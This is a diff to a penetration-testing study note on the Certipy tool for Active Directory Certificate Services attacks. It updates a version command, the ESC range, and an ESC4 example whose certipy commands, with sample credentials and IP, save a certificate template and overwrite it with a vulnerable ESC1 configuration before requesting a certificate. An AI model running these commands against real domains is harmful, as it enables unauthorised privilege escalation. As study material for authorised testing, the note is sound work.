@@ -20,7 +20,7 @@ certipy -h
 
 > [!note] The companion tool **Certify** (C# — Windows) is also commonly used. Certipy is the Linux equivalent and handles most of the same attacks. For Windows targets, Certify can be run directly on the host.
 
-> [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] for the full ESC1–ESC16 attack methodology this tool is used against. Also [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — AD CS ESC paths from a low-priv domain user. [[Tools/AD/BloodHound|BloodHound]] surfaces the enroll/`ADCS`-related edges that point you at a template; the Windows counterparts are [[Tools/AD/Certify|Certify]] (enum/request) and [[Tools/AD/PKINITtools|PKINITtools]] (manual PKINIT when you want Certipy's `auth` steps split out).
+> [!note] **See also** — [[Services/Active Directory/ADCS|ADCS]] for the full ESC1–ESC17 attack methodology this tool is used against. Also [[Class notes/HTB Academy/CPTS v2 (claude)/Windows Priv Esc|Windows Priv Esc]] (CPTS v2) — AD CS ESC paths from a low-priv domain user. [[Tools/AD/BloodHound|BloodHound]] surfaces the enroll/`ADCS`-related edges that point you at a template; the Windows counterparts are [[Tools/AD/Certify|Certify]] (enum/request) and [[Tools/AD/PKINITtools|PKINITtools]] (manual PKINIT when you want Certipy's `auth` steps split out).
 
 ---
 
@@ -44,7 +44,7 @@ certipy -h
 | ESC15 | v1 template application-policies injection (CVE-2024-49019 "EKUwu") | Enroll rights on a v1 (schema v1) template |
 | ESC16 | Security extension disabled CA-wide (global ESC9) | Any valid enrollment on affected CA |
 
-> [!note] **Version.** Confirm with `certipy version`. v5.x also supports **ESC17**; the table lists the ones you'll actually hit. Full methodology + prerequisites for every ESC lives in [[Services/Active Directory/ADCS|ADCS]] — Certipy is the *tool*, that note is the *playbook*.
+> [!note] **Version.** Confirm with `certipy -v` (there is no `version` subcommand). v5.x also supports **ESC17**; the table lists the ones you'll actually hit. Full methodology + prerequisites for every ESC lives in [[Services/Active Directory/ADCS|ADCS]] — Certipy is the *tool*, that note is the *playbook*.
 
 ---
 
@@ -151,13 +151,13 @@ You have GenericWrite or write access on a certificate template — modify it to
 certipy template -u jsmith@corp.local -p 'Password123!' \
   -dc-ip 10.10.10.10 \
   -template VulnerableTemplate \
-  -save-old
+  -save-configuration VulnerableTemplate.json
 
-# Make template vulnerable (ESC1 conditions)
+# Make template vulnerable (applies Certipy's stock ESC1 configuration)
 certipy template -u jsmith@corp.local -p 'Password123!' \
   -dc-ip 10.10.10.10 \
   -template VulnerableTemplate \
-  -configuration 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT'
+  -write-default-configuration -force
 
 # Exploit as ESC1
 certipy req -u jsmith@corp.local -p 'Password123!' \
@@ -382,5 +382,5 @@ certipy cert -pfx output.pfx -pem cert.pem -key key.pem
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-01*
-*Model: claude-opus-5*
+*Updated: 2026-09-22*
+*Model: claude-opus-4-8*
